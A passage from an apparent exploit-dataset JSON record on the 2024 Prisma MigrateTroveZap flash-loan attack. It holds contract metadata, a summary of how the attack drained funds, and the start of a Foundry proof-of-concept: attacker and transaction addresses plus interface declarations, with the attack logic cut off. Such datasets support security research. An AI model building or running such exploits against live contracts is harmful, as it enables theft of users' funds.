972e3cbee9ee", "artifact_dir": "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.19+commit.7dd6d404", "contract_name": "MigrateTroveZap", "explorer_url": "https://etherscan.io/address/0xcc7218100da61441905e0c327749972e3cbee9ee", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:36:21.497Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/zaps/MigrateTroveZap.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/utils/Address.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/access/Ownable.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/utils/Context.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/token/ERC20/IERC20.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/token/ERC20/utils/SafeERC20.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/token/ERC20/extensions/IERC20Permit.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/interfaces/ITroveManager.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/interfaces/IDebtToken.sol", "data/contracts/2024_03_prisma/contracts/01_vulnerable_cc721810_migratetrovezap/sources/contracts/interfaces/IBorrowerOperations.sol"], "source_hint": "AI extracted: The MigrateTroveZap contract (0xcc7218100da61441905e0c327749972e3cbee9ee) is exploited by a flash loan attack. The attack leverages the `flashLoan` function of the mkUSD token and the `receiveFlashLoan` function of the attacker contract to manipulate trove operations and drain funds.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_03_prisma", "id": "2024_03_prisma", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:36:24.633Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~$11M
// Attacker: 0x7e39e3b3ff7adef2613d5cc49558eab74b9a4202
// Attack Contract: 0xd996073019c74b2fb94ead236e32032405bc027c
// Vulnerable Contract: 0xcc7218100da61441905e0c327749972e3cbee9ee
// Attack Tx: https://etherscan.io/tx/0x00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7

// @Analyses
// https://twitter.com/EXVULSEC/status/1773371049951797485
// https://twitter.com/PrismaFi/status/1773371030129524957

/////////////////////////////////////// Interfaces ///////////////////////////////////////

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(
        address owner
    ) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IMKUSDLoan {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IBorrowerOperations {
    function setDelegateApproval(address _delegate, bool _isApproved) external;

    function openTrove(
        address troveManager,
        address account,
        uint256 _maxFeePercentage,
        uint256 _collateralAmount,
        uint256 _debtAmount,
        address _upperHint,
        address _lowerHint
    ) external;

    function closeTrove(address troveManager, address account) external;
}

